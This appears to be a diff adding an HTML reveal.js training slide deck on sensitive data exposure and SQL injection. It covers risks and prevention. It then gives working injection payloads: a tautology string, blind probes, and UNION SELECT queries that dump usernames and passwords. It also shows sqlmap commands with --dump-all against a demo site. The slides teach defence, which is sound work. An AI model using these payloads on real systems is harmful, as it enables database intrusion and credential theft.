@@ -1,0 +1,255 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>Sensitive Data Exposure</title>
+
+		<link rel="stylesheet" href="dist/reset.css">
+		<link rel="stylesheet" href="dist/reveal.css">
+		<link rel="stylesheet" href="dist/theme/black.css" id="theme">
+
+		<!-- Theme used for syntax highlighted code -->
+		<link rel="stylesheet" href="plugin/highlight/monokai.css" id="highlight-theme">
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section>
+					<img src="./img/data-protection.png">
+					<h1>Sensitive Data Exposure</h1>
+				</section>
+				<section>
+					<section>
+						<img src="./img/attacker.png" style="width:100px">
+						<h2>Attack vectors</h2>
+					</section>
+					<section>
+						<ul>
+							<li>Key steal</li>
+							<li>MitM attacks</li>
+							<li>Steal plain text data from server of while in transit</li>
+							<li>Password cracking from DBs</li>
+						</ul>
+					</section>
+				</section>
+				<section>
+					<section>
+						<img src="./img/padlock.png" style="width:100px">
+						<h2>Security weakness</h2>
+					</section>
+					<section>
+						<ul>
+							<li>Not encrypted sensitive data</li>
+							<li>Weak key generation and management</li>
+							<li>Weak crypto algorithm, protocol and cipher usage</li>
+						</ul>
+					</section>
+				</section>
+				<section>
+					<section>
+						<img src="./img/target.png" style="width:100px">
+						<h2>Impacts</h2>
+					</section>
+					<section>
+						<ul>
+							<li>Identity steal</li>
+							<li>Data leak</li>
+							<ul>
+								<li>Health records</li>
+								<li>Credentials</li>
+								<li>Personal data</li>
+								<li>Credit cards</li>
+							</ul>
+						</ul>
+					</section>
+				</section>
+				<section>
+					<section>
+						<img src="./img/zoom.png" style="width:100px">
+						<h2>Is the application vulnerable?</h2>
+					</section>
+					<section>
+						<ul>
+							<li>Which data need to be protected?</li>
+							<ul>
+								<li>Defined by privacy laws or regulations</li>
+								<li>EU - General Data Protection Regulation</li>
+								<li>ČR - 101/2000 Sb. Zákon o ochraně osobních údajů</li>
+								<li>Passwords, credit card numbers, health records, personal information, business secrets...</li>
+							</ul>
+						</ul>
+					</section>
+					<section>
+						<ul>
+							<li>Data transmitted in clear text (HTTP, SMTP, FTP...)</li>
+							<li>Old or weak crypto algorithms</li>
+							<li>Default crypto keys in use</li>
+							<li>Weak crypto keys generated or re-used</li>
+							<li>Missing key management and key rotation</li>
+							<li>Not enforced encryption (security directives and headers)</li>
+							<li>Certificate validation</li>
+						</ul>
+					</section>
+				</section>
+				<section>
+					<section>
+						<img src="./img/safe.png" style="width:100px">
+						<h2>How to prevent?</h2>
+					</section>
+					<section>
+						<ul>
+							<li>Classify data processed, stored and transmitted, identify sensitive data</li>
+							<li>Apply controls as per the classification</li>
+							<li>Don't store sensitive data unnecessarily, discard or truncate</li>
+							<li>Encrypt all sensitive data</li>
+						</ul>
+					</section>
+					<section>
+						<ul>
+							<li>Ensure up-to-date and strong algorithms, protocols and keys</li>
+							<li>Enforce encryption (HSTS...)</li>
+							<li>Disable caching for response with sensitive data</li>
+							<li>Store passwords using strong and salted hasing functions with delay factor</li>
+						</ul>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>Example</h2>
+					</section>
+					<section>
+						<h3>Source code</h3>
+						<pre><code data-trim data-noescape>
+String query = 
+"SELECT * FROM accounts 
+WHERE custID='" + request.getParameter("id") + "'";
+  						</code></pre>
+  						<h3>Request</h3>
+						<pre><code data-trim data-noescape>
+http://example.com/app/accountView?id=' or '1'='1
+  						</code></pre>
+  						<h3>Leads to SQL</h3>
+<pre><code data-trim data-noescape>
+SELECT * FROM accounts WHERE custID='' or '1'='1';
+  						</code></pre>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>Real Example</h2>
+					</section>
+					<section>
+						<h3>Source code of the <a href="https://exploited.cz/sql/products.php" target="_blank">demo app</a></h3>
+						<pre><code data-trim data-noescape>
+mysql_connect($dbHost, $dbUsername, $dbPassword);
+mysql_select_db($dbSchema);
+mysql_set_charset('utf8');
+if (isset($_GET['id'])) {
+  $id = $_GET['id']; // is this enough?
+  $id = (int) $_GET['id'];  // or this?
+  $id = mysql_real_escape_string($_GET['id']); // or this?
+  $sql = "SELECT id, name, description, image 
+  FROM products WHERE id = $id";
+} else {
+  $sql = "SELECT id, name, description, image 
+  FROM products ORDER BY name";
+}
+$result = mysql_query($sql);
+  						</code></pre>
+					</section>
+					<section>
+						<h3>Blind SQL Injection</h3>
+						<pre><code data-trim data-noescape>
+id=1 AND 1=1
+id=1 AND 1=2
+  						</code></pre>
+					</section>
+					<section>
+						<h3>Number of rows</h3>
+						<pre><code data-trim data-noescape>
+id=1 UNION SELECT 1,DATABASE(),VERSION(),4
+  						</code></pre>
+					</section>
+					<section>
+						<h3>DB info</h3>
+						<pre><code data-trim data-noescape>
+id=1 UNION SELECT 1,DATABASE(),VERSION(),4
+id=1 UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns
+  						</code></pre>
+					</section>
+					<section>
+						<h3>Users</h3>
+						<pre><code data-trim data-noescape>
+id=1 UNION SELECT 1,username,password,4 FROM users
+  						</code></pre>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>sqlmap</h2>
+					</section>
+					<section>
+						<ul>
+							<li>Open source penetration testing tool</li>
+							<li>Automates the process of detecting and exploiting SQL injection flaws</li>
+						</ul>
+					</section>
+					<section>
+						<h3>Demo</h3>
+						<pre><code data-trim data-noescape>
+python sqlmap.py -u "https://exploited.cz/sql/products.php?id=1" -p id
+python sqlmap.py -u "https://exploited.cz/sql/products.php?id=1" -p id --dump-all
+  						</code></pre>
+					</section>
+				</section>
+				<section>
+					<section>
+						<h2>References</h2>
+					</section>
+					<section>
+						<h3>OWASP</h3>
+						<ul>
+							<li><a href="/www-project-proactive-controls/v3/en/c3-secure-database">Proactive Controls: Secure Database Access</a></li>
+							<li><a href="/www-project-application-security-verification-standard">ASVS: V5 Input Validation and Encoding</a></li>
+							<li><a href="/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">esting Guide: SQL Injection</a></li>
+							<li><a href="/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">Command Injection</a> and <a href="/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection">ORM Injection</a></li>
+							<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html">Cheat Sheet: Injection Prevention</a></li>
+							<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">Cheat Sheet: SQL Injection Prevention</a></li>
+							<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">Cheat Sheet: Query Parameterization</a></li>
+							<li><a href="/www-project-automated-threats-to-web-applications/">Automated Threats to Web Applications – OAT-014</a></li>
+						</ul>
+					</section>
+					<section>
+						<h3>Others</strong>
+						<ul>
+							<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></li>
+							<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></li>
+							<li><a href="https://cwe.mitre.org/data/definitions/564.html">CWE-564: Hibernate Injection</a></li>
+							<li><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917: Expression Language Injection</a></li>
+							<li><a href="https://portswigger.net/kb/issues/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a></li>
+							<li><a href="https://www.michalspacek.cz/">Michal Špaček</a>
+						</ul>
+					</section>
+				</section>
+			</div>
+		</div>
+
+		<script src="dist/reveal.js"></script>
+		<script src="plugin/notes/notes.js"></script>
+		<script src="plugin/markdown/markdown.js"></script>
+		<script src="plugin/highlight/highlight.js"></script>
+		<script>
+			// More info about initialization & config:
+			// - https://revealjs.com/initialization/
+			// - https://revealjs.com/config/
+			Reveal.initialize({
+				hash: true,
+
+				// Learn about plugins: https://revealjs.com/plugins/
+				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
+			});
+		</script>
+	</body>
+</html>
